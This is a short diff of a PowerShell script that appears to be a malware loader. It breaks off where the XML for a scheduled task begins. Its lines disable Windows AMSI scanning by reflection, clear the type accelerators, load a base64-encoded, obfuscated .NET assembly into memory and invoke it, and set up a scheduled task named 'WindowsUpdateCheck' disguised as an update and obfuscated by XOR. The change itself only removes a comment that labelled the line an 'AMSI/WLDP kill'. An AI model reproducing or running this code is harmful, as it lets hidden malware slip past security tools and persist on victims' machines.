@@ -1,6 +1,6 @@
 $null = [Ref].Assembly.GetTypes();[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 [Ref].Assembly.GetType('System.Management.Automation.TypeAccelerators').GetField('m_typeAccelerators','NonPublic,Static').SetValue($null,@{})
-$code = "[DllImport(`"kernel32.dll`")]public static extern bool DeleteFileW([MarshalAs(UnmanagedType.LPWStr)]string);";$t=[Reflection.Assembly]::Load([Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...')).GetType('ConfuserEx2.Class1');$t.GetMethod('ConfuserEx2').Invoke($null,$null); # AMSI/WLDP kill
+$code = "[DllImport(`"kernel32.dll`")]public static extern bool DeleteFileW([MarshalAs(UnmanagedType.LPWStr)]string);";$t=[Reflection.Assembly]::Load([Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...')).GetType('ConfuserEx2.Class1');$t.GetMethod('ConfuserEx2').Invoke($null,$null);
 
 $taskname = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("WindowsUpdateCheck")) | ForEach {[char]($_-bxor 0x5F)};
 $taskxml = @"
